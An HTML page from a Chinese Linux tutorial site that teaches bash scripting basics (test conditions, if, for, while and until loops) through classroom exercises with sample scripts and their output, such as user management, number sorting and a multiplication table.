<!DOCTYPE html>
<html lang="zh-cn">
<head prefix="og: http://ogp.me/ns#">
  <meta charset="utf-8">
  <title>shell 脚本 | BoobooWei</title>
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- Canonical links -->
  <link rel="canonical" href="http://www.toberoot.com/linux/booboo_bash_shell_scripts/01_shell_flow_control_statement.html">
  <!-- Alternative links -->
  
    
      <link rel="alternative" hreflang="zh-cn" href="http://www.toberoot.com/zh-cn/linux/booboo_bash_shell_scripts/01_shell_flow_control_statement">
    
  
  <!-- Icon -->
  <link rel="apple-touch-icon" sizes="57x57" href="/icon/apple-touch-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="114x114" href="/icon/apple-touch-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="72x72" href="/icon/apple-touch-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="144x144" href="/icon/apple-touch-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="60x60" href="/icon/apple-touch-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="120x120" href="/icon/apple-touch-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="76x76" href="/icon/apple-touch-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/icon/apple-touch-icon-152x152.png">
  <link rel="icon" type="image/png" href="/icon/favicon-196x196.png" sizes="196x196">
  <link rel="icon" type="image/png" href="/icon/favicon-160x160.png" sizes="160x160">
  <link rel="icon" type="image/png" href="/icon/favicon-96x96.png" sizes="96x96">
  <link rel="icon" type="image/png" href="/icon/favicon-16x16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="/icon/favicon-32x32.png" sizes="32x32">
  <meta name="msapplication-TileColor" content="#2f83cd">
  <meta name="msapplication-TileImage" content="/icon/mstile-144x144.png">
  <!-- CSS -->
  <!-- build:css build/css/navy.css -->
  
<link rel="stylesheet" href="/css/navy.css">

  <!-- endbuild -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-lato@0.0.75/index.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.3.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/docsearch.js/1/docsearch.min.css">
  <!-- RSS -->
  <link rel="alternate" href="/atom.xml" title="BoobooWei" type="application/atom+xml">
  <!-- Open Graph -->
  <meta name="description" content="shell 的基本组成元素  1&gt; 魔法字符 “ #! ”: 出现在脚本第一行 , 用于定义命令解释器。 2&gt; “ # ” 号开头的行 : 除了第一行的魔法字符以外 , 其他以 ” # “ 号开头 的行是注示。这些行不会被运行 , 只是给人阅读使用。 3&gt; 系统命令 :shell 脚本中运行解释的系统命令。 4&gt; 变量 : 脚本运行过程中某些反复调用的值的暂存地。 5&amp;">
<meta property="og:type" content="website">
<meta property="og:title" content="shell 脚本">
<meta property="og:url" content="http://www.toberoot.com/linux/booboo_bash_shell_scripts/01_shell_flow_control_statement">
<meta property="og:site_name" content="BoobooWei">
<meta property="og:description" content="shell 的基本组成元素  1&gt; 魔法字符 “ #! ”: 出现在脚本第一行 , 用于定义命令解释器。 2&gt; “ # ” 号开头的行 : 除了第一行的魔法字符以外 , 其他以 ” # “ 号开头 的行是注示。这些行不会被运行 , 只是给人阅读使用。 3&gt; 系统命令 :shell 脚本中运行解释的系统命令。 4&gt; 变量 : 脚本运行过程中某些反复调用的值的暂存地。 5&amp;">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2020-10-13T11:33:32.516Z">
<meta property="article:modified_time" content="2020-10-13T11:33:32.516Z">
<meta property="article:author" content="魏亚萍">
<meta name="twitter:card" content="summary">
<meta property="fb:admins" content="100000247608790">
  <!-- Google Analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-48498357-3', 'auto');
  ga('send', 'pageview');
</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-6482217598104186",
          enable_page_level_ads: true
     });
  </script>
  <!-- at the end of the HEAD -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/docsearch.js@2/dist/cdn/docsearch.min.css" />
</head>

<body>
  <div id="container">
    <header id="header" class="wrapper">
  <div id="header-inner" class="inner">
    <h1 id="logo-wrap">
      <a href='/' id="logo">ToBeRoot</a>
    </h1>
    <nav id="main-nav">
      <a href="/api/" class="main-nav-link">MySQL8.0</a><a href="/linux/" class="main-nav-link">Linux</a><a href="/mysql/" class="main-nav-link">MySQL</a><a href="/oracle/" class="main-nav-link">Oracle</a><a href="/python/" class="main-nav-link">Python</a><a href="/git/" class="main-nav-link">Git</a><a href="/tick/" class="main-nav-link">TICK</a><a href="/mse/" class="main-nav-link">MSE</a><a href="/aliyun/" class="main-nav-link">AliYun</a><a href="/news/" class="main-nav-link">News</a>
      <a target="_blank" href="https://github.com/BoobooWei" rel="external nofollow noreferrer noopener" class="main-nav-link"><i class="fa fa-github-alt"></i></a>
      <div id="search-input-wrap">
        <div id="search-input-icon">
          <i class="fa fa-search"></i>
        </div>
        <input type="search" id="search-input" placeholder="Search...">
      </div>
    </nav>
    <div id="lang-select-wrap">
      <label id="lang-select-label"><i class="fa fa-globe"></i><span>简体中文</span></label>
      <select id="lang-select" data-canonical="">
        
          <option value="zh-cn" selected>简体中文</option>
        
      </select>
    </div>
    <a id="mobile-nav-toggle">
      <span class="mobile-nav-toggle-bar"></span>
      <span class="mobile-nav-toggle-bar"></span>
      <span class="mobile-nav-toggle-bar"></span>
    </a>
  </div>
</header>

    <div id="content-wrap">
  <div id="content" class="wrapper">
    <div id="content-inner">
      <article class="article-container" itemscope itemtype="http://schema.org/Article">
        <div class="article-inner">
          <div class="article">
            <div class="inner">
              <header class="article-header">
                <h1 class="article-title" itemprop="name">shell 脚本</h1>
                <a target="_blank" href="https://github.com/booboowei/site/edit/master/source/linux/booboo_bash_shell_scripts/01_shell_flow_control_statement.md" rel="external nofollow noreferrer noopener" class="article-edit-link" title="改进本文"><i class="fa fa-pencil"></i></a>
              </header>
              <div class="article-content" itemprop="articleBody">
                <hr>
<ol>
<li><p>shell 的基本组成元素</p>
<ul>
<li>1&gt; 魔法字符 “ #! ”: 出现在脚本第一行 , 用于定义命令解释器。</li>
<li>2&gt; “ # ” 号开头的行 : 除了第一行的魔法字符以外 , 其他以 ” # “ 号开头 的行是注示。这些行不会被运行 , 只是给人阅读使用。</li>
<li>3&gt; 系统命令 :shell 脚本中运行解释的系统命令。</li>
<li>4&gt; 变量 : 脚本运行过程中某些反复调用的值的暂存地。</li>
<li>5&gt; 流程控制语句 : 判断 , 循环 , 跳转等流程控制。</li>
</ul>
</li>
<li><p>执行脚本的方法</p>
<ul>
<li>1&gt; bash 脚本名称 bash -x 以调试模式来运行脚本</li>
<li>2&gt; ./ 脚本名称 –&gt; 需要对脚本有可执行的权限</li>
</ul>
</li>
<li><p>shell的基本语法</p>
<ul>
<li>条件判断语句     if test</li>
<li>循环语句    for while unitl</li>
<li>其他流程控制     case continue break shift function</li>
</ul>
</li>
</ol>
<h3 id="判断条件" class="article-heading"><a href="#判断条件" class="headerlink" title="判断条件"></a>判断条件<a class="article-anchor" href="#判断条件" aria-hidden="true"></a></h3><p>test 判断—————man test 查看的相关的判断指令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">     数字的判断     字符的判断     文件的判断</span><br><span class="line">-gt 大于     -z 空         -d 文件是不是一个目录</span><br><span class="line">-ge 大于等于     =  字符相等     -f 是不是一个普通文件</span><br><span class="line">-lt 小于     != 字符不相等     -e 文件是不是存在</span><br><span class="line">-le 小于等于     -n 非空     </span><br><span class="line">-ne 不等于     -a 逻辑与</span><br><span class="line">-eq 等于     -o 逻辑或</span><br></pre></td></tr></table></figure>
<pre><code>注意 ：
* [ ] 括号两边有空格
* 判断符号两边有空格</code></pre><h3 id="if-语法格式" class="article-heading"><a href="#if-语法格式" class="headerlink" title="if 语法格式"></a>if 语法格式<a class="article-anchor" href="#if-语法格式" aria-hidden="true"></a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if condition    --&gt;condition 指的是判断的条件</span><br><span class="line">then        </span><br><span class="line">    CMD1    --&gt; CMD1 指的是满足判断条件后执行的语句</span><br><span class="line">else</span><br><span class="line">    CMD2    --&gt; CMD2 指的是不满足判断条件执行的语句 then</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">    CMD1</span><br><span class="line">elif condition</span><br><span class="line">    CMD2</span><br><span class="line">else</span><br><span class="line">    CMD3</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<h4 id="课堂练习" class="article-heading"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习<a class="article-anchor" href="#课堂练习" aria-hidden="true"></a></h4><pre><code>1. 写一个脚本，判断用户是否存在，如果存在则删除。若不存在，就提示不存在。
2. 三个数字比大小，输出最大的
3. 三个数字比大小,并且按从大到小排列</code></pre><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="comment">#74#root@client0 ~]#cat usertest.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"plz input username:"</span> user</span><br><span class="line"><span class="keyword">if</span> id <span class="variable">$user</span> &amp;&gt; /dev/null</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    userdel -r <span class="variable">$user</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"student not exits"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">[<span class="comment">#75#root@client0 ~]#cat num.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -gt <span class="variable">$2</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$1</span> -gt <span class="variable">$3</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"max is <span class="variable">$1</span>"</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"max is <span class="variable">$3</span>"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$2</span> -gt <span class="variable">$3</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"max is <span class="variable">$2</span>"</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"max is <span class="variable">$3</span>"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#&#125;</span></span><br><span class="line">[<span class="comment">#76#root@client0 ~]#bash num.sh 9 8 80</span></span><br><span class="line">max is 80</span><br><span class="line">3</span><br><span class="line">[<span class="comment">#99#root@client0 ~]#cat sort.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -ge <span class="variable">$2</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    n1=<span class="variable">$1</span></span><br><span class="line">    n2=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    n1=<span class="variable">$2</span></span><br><span class="line">    n2=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$n1</span> -ge <span class="variable">$3</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    max=<span class="variable">$n1</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$n2</span> -ge <span class="variable">$3</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        be=<span class="variable">$n2</span></span><br><span class="line">        min=<span class="variable">$3</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        be=<span class="variable">$3</span></span><br><span class="line">        min=<span class="variable">$n2</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    max=<span class="variable">$3</span></span><br><span class="line">    be=<span class="variable">$n1</span></span><br><span class="line">    min=<span class="variable">$n2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$max</span> <span class="variable">$be</span> <span class="variable">$min</span></span><br><span class="line">[<span class="comment">#101#root@client0 ~]#bash sort.sh 3 8 1</span></span><br><span class="line">8 3 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="for-语法格式" class="article-heading"><a href="#for-语法格式" class="headerlink" title="for 语法格式"></a>for 语法格式<a class="article-anchor" href="#for-语法格式" aria-hidden="true"></a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for 变量 in 取值范围</span><br><span class="line">do</span><br><span class="line">    CMD</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<h4 id="取值范围" class="article-heading"><a href="#取值范围" class="headerlink" title="取值范围"></a>取值范围<a class="article-anchor" href="#取值范围" aria-hidden="true"></a></h4><ul>
<li><p>以空格分割</p>
<pre><code>for i in 1 2 3
for i in 5 7 10
for i in a b c</code></pre><p>例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">         for i in 10 11</span><br><span class="line">do</span><br><span class="line">    ssh root@172.25.0.$i &quot;yum install -y wget&quot;</span><br><span class="line">done</span><br><span class="line">for i in xx uu</span><br><span class="line">do</span><br><span class="line">    ls &#x2F;tmp&#x2F;$i</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
</li>
<li><p>以{}罗列        {1..10}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以使用seq    $(seq 1 10)&#x3D;&#x3D;&gt;1 2 3 4 5 6 7 8 9 10</span><br><span class="line">        &#96;seq 1 10&#96;</span><br><span class="line">        seq 1 2 10&#x3D;&#x3D;&gt;1 3 5 7 9</span><br><span class="line">        seq 10 -1 1&#x3D;&#x3D;&gt;10 9 8 7 6 5 4 3 2 1</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="命令行方式" class="article-heading"><a href="#命令行方式" class="headerlink" title="命令行方式"></a>命令行方式<a class="article-anchor" href="#命令行方式" aria-hidden="true"></a></h4><pre><code>for i in {1..10};do echo $i;done</code></pre><h4 id="课堂练习-1" class="article-heading"><a href="#课堂练习-1" class="headerlink" title="课堂练习"></a>课堂练习<a class="article-anchor" href="#课堂练习-1" aria-hidden="true"></a></h4><ol>
<li>统计当前系统一共有多少个用户，并且向每个用户问好，屏幕输出“hello $username,your uid is $uid”</li>
<li>依次向/var/目录下的每个文件问好“hello $file” ,统计一共有多少个文件</li>
<li>输入用户名，当前系统中属于该用户的所有文件都会打印在屏幕上，并且告诉你文件大小超过$size的文件有哪些</li>
<li>计算某个命令执行的时间</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client47 ~]<span class="comment"># cat for1.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> 系统中一共有：`cat /etc/passwd |wc -l`个用户</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `cut -d <span class="string">":"</span> -f 1 /etc/passwd 2&gt;/dev/null`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    username=<span class="variable">$i</span></span><br><span class="line">    uid=`grep ^<span class="variable">$i</span> /etc/passwd |cut -d <span class="string">":"</span> -f 3 2&gt;/dev/null`</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"hello <span class="variable">$username</span>,your uid is <span class="variable">$uid</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">[root@client47 ~]<span class="comment"># bash for1.sh</span></span><br><span class="line">系统中一共有：22个用户</span><br><span class="line">hello root,your uid is 0</span><br><span class="line">hello bin,your uid is 1</span><br><span class="line">hello daemon,your uid is 2</span><br><span class="line">hello adm,your uid is 3</span><br><span class="line">hello lp,your uid is 4</span><br><span class="line">hello sync,your uid is 5</span><br><span class="line">hello shutdown,your uid is 6</span><br><span class="line">hello halt,your uid is 7</span><br><span class="line">hello mail,your uid is 8</span><br><span class="line">hello operator,your uid is 11</span><br><span class="line">hello games,your uid is 12</span><br><span class="line">hello ftp,your uid is 14</span><br><span class="line">hello nobody,your uid is 99</span><br><span class="line">hello avahi-autoipd,your uid is 170</span><br><span class="line">hello systemd-bus-proxy,your uid is 999</span><br><span class="line">hello systemd-network,your uid is 998</span><br><span class="line">hello dbus,your uid is 81</span><br><span class="line">hello polkitd,your uid is 997</span><br><span class="line">hello tss,your uid is 59</span><br><span class="line">hello postfix,your uid is 89</span><br><span class="line">hello sshd,your uid is 74</span><br><span class="line">hello student,your uid is 1000</span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for2.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `ls /var/`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> hello <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> /var目录中一共有`ls -l /var/|wc -l`个文件</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for2.sh</span></span><br><span class="line">hello adm</span><br><span class="line">hello cache</span><br><span class="line">hello crash</span><br><span class="line">hello db</span><br><span class="line">hello empty</span><br><span class="line">hello games</span><br><span class="line">hello gopher</span><br><span class="line">hello kerberos</span><br><span class="line">hello lib</span><br><span class="line">hello <span class="built_in">local</span></span><br><span class="line">hello lock</span><br><span class="line">hello <span class="built_in">log</span></span><br><span class="line">hello mail</span><br><span class="line">hello nis</span><br><span class="line">hello opt</span><br><span class="line">hello preserve</span><br><span class="line">hello run</span><br><span class="line">hello spool</span><br><span class="line">hello tmp</span><br><span class="line">hello yp</span><br><span class="line">/var目录中一共有21个文件</span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for3.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请输入用户名："</span> username</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请输入文件SIZE的最大值："</span> size</span><br><span class="line"></span><br><span class="line">find / -user <span class="variable">$username</span> -size +<span class="variable">$size</span> 2&gt;/dev/null</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for3.sh</span></span><br><span class="line">请输入用户名：root</span><br><span class="line">请输入文件SIZE的最大值：500M</span><br><span class="line">/proc/kcore</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for3.sh</span></span><br><span class="line">请输入用户名：root</span><br><span class="line">请输入文件SIZE的最大值：100M</span><br><span class="line">/proc/kcore</span><br><span class="line">/usr/lib/locale/locale-archive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for4.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"plz input CMD:"</span> cmd</span><br><span class="line">start=`date +%s`</span><br><span class="line"><span class="variable">$cmd</span> &amp;&gt; /dev/null</span><br><span class="line">end=`date +%s`</span><br><span class="line">time=$((<span class="variable">$end</span>-<span class="variable">$start</span>))</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cmd</span> 执行的时间为 <span class="variable">$time</span></span><br><span class="line">[root@client47 ~]<span class="comment"># bash for4.sh</span></span><br><span class="line">plz input CMD:xz -d /tmp/big.xz</span><br><span class="line">xz -d /tmp/big.xz 执行的时间为 2</span><br></pre></td></tr></table></figure>

<h4 id="拓展题" class="article-heading"><a href="#拓展题" class="headerlink" title="拓展题"></a>拓展题<a class="article-anchor" href="#拓展题" aria-hidden="true"></a></h4><ol>
<li>画斜线正反<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*</span><br><span class="line"> *</span><br><span class="line">  *</span><br><span class="line">   *</span><br></pre></td></tr></table></figure></li>
<li>写一个9*9乘法表</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat x1.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#行数    空格    *数量</span></span><br><span class="line"><span class="comment">#1     0     1</span></span><br><span class="line"><span class="comment">#2    1    1</span></span><br><span class="line"><span class="comment">#3    2    1</span></span><br><span class="line"><span class="comment">#n    n-1    1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 <span class="variable">$1</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> `seq 1 $((<span class="variable">$i</span>-<span class="number">1</span>))`</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">' '</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span>  <span class="string">'*'</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash x1.sh 4</span></span><br><span class="line">*</span><br><span class="line"> *</span><br><span class="line">  *</span><br><span class="line">   *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># cat x2.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#1*1=1</span></span><br><span class="line"><span class="comment">#2*1=2    2*2=4</span></span><br><span class="line"><span class="comment">#3*1=3    3*2    3*3</span></span><br><span class="line"><span class="comment">#9*1    9*2                9*9=</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 9`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> `seq 1 <span class="variable">$i</span>`</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">"<span class="variable">$i</span>*<span class="variable">$j</span>=<span class="subst">$(($i*$j)</span>) "</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash x2.sh</span></span><br><span class="line">1*1=1</span><br><span class="line">2*1=2 2*2=4</span><br><span class="line">3*1=3 3*2=6 3*3=9</span><br><span class="line">4*1=4 4*2=8 4*3=12 4*4=16</span><br><span class="line">5*1=5 5*2=10 5*3=15 5*4=20 5*5=25</span><br><span class="line">6*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=36</span><br><span class="line">7*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=49</span><br><span class="line">8*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=64</span><br><span class="line">9*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81</span><br></pre></td></tr></table></figure>

<h3 id="while-语法格式" class="article-heading"><a href="#while-语法格式" class="headerlink" title="while 语法格式"></a>while 语法格式<a class="article-anchor" href="#while-语法格式" aria-hidden="true"></a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">    while condition 指的是判断的条件</span><br><span class="line">    do</span><br><span class="line">        CMD</span><br><span class="line">    done</span><br><span class="line">数字的判断     字符的判断     文件的判断</span><br><span class="line">    -gt 大于     -z 空         -d 文件是不是一个目录</span><br><span class="line">    -ge 大于等于     =  字符相等     -f 是不是一个普通文件</span><br><span class="line">    -lt 小于     != 字符不相等     -e 文件是不是存在</span><br><span class="line">    -le 小于等于     -n 非空     </span><br><span class="line">    -ne 不等于     -a 逻辑与</span><br><span class="line">    -eq 等于     -o 逻辑或</span><br></pre></td></tr></table></figure>


<ol>
<li>当什么的时候就做什么,体验无限循环<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">touch /tmp/whilefile</span><br><span class="line">while [ -f /tmp/whilefile ]</span><br><span class="line">do</span><br><span class="line">    cat &gt;&gt; /tmp/whilefile &lt;&lt; ENDF</span><br><span class="line">当山峰没有棱角的时候</span><br><span class="line">当河水不再流</span><br><span class="line">。。。</span><br><span class="line">我哈哈ishi</span><br><span class="line">ENDF</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure></li>
<li>不满足条件跳出循环<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">判断/tmp/whilefile2是否存在，不存在的时候我们去创建</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while [ ! -e /tmp/whilefile2 ]</span><br><span class="line">do</span><br><span class="line">    cat &gt; /tmp/whilefile2 &lt;&lt; ENDF</span><br><span class="line">hello</span><br><span class="line">ENDF</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h3 id="until-语法格式" class="article-heading"><a href="#until-语法格式" class="headerlink" title="until 语法格式"></a>until 语法格式<a class="article-anchor" href="#until-语法格式" aria-hidden="true"></a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">until condition --&gt; 不满足 condition, 则执行 cmd</span><br><span class="line">do</span><br><span class="line">    CMD</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="课堂练习-2" class="article-heading"><a href="#课堂练习-2" class="headerlink" title="课堂练习"></a>课堂练习<a class="article-anchor" href="#课堂练习-2" aria-hidden="true"></a></h4><pre><code>1. 连乘算法 while和until
2. 要求根据userlist创建用户，要求指定用户名，用户id，用户的附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。
userlist文件的格式如下：
carol 777 tom uplooking
natasha 778 tom uplooking
r1 779 tom uplooking
3. 要求根据userlist创建用户，要求指定用户名，用户id，用户的默认组和附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。
[root@rhel6 ~]# cat /tmp/useraddlist1
dabao 888 xuexi,it uplooking
lucy 889 sales,it uplooking
lily 899 pro,aa uplooking</code></pre><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat useradd.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> a</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    A=(<span class="variable">$a</span>)</span><br><span class="line">    groupadd <span class="variable">$&#123;A[2]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">    useradd -u <span class="variable">$&#123;A[1]&#125;</span> -G <span class="variable">$&#123;A[2]&#125;</span> <span class="variable">$&#123;A[0]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$&#123;A[3]&#125;</span>|passwd --stdin <span class="variable">$&#123;A[0]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">    id <span class="variable">$&#123;A[0]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span>&lt;/root/userlist</span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash useradd.sh</span></span><br><span class="line">uid=777(carol) gid=1001(carol) groups=1001(carol),1000(tom)</span><br><span class="line">uid=778(natasha) gid=1002(natasha) groups=1002(natasha),1000(tom)</span><br><span class="line">uid=779(r1) gid=1003(r1) groups=1003(r1),1000(tom)</span><br></pre></td></tr></table></figure>

<h3 id="晚自习作业" class="article-heading"><a href="#晚自习作业" class="headerlink" title="晚自习作业"></a>晚自习作业<a class="article-anchor" href="#晚自习作业" aria-hidden="true"></a></h3><ol>
<li>完成今天课上的所有练习题目</li>
<li>石子游戏：有n石子，谁拿到最后一个石子谁赢，<br>用户可以指定一共由多少个石子，每次最多可以拿的石子数是可以给用户指定的</li>
<li>创建一个以今天日期为名的目录20160811;<br>将/目录下所有以.sh结尾的文件复制到新创建的目录中；<br>将该目录打包压缩存到/tmp目录下保存。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat game</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"游戏开始！请玩家指定石子的个数:"</span> n1</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请玩家指定每次取石子的最多个数:"</span> n2</span><br><span class="line"></span><br><span class="line">k=$((<span class="variable">$n1</span>%(<span class="variable">$n2</span>+<span class="number">1</span>)))</span><br><span class="line">j=$((<span class="variable">$n1</span>/(<span class="variable">$n2</span>+<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">HH</span></span> () &#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 <span class="variable">$j</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span 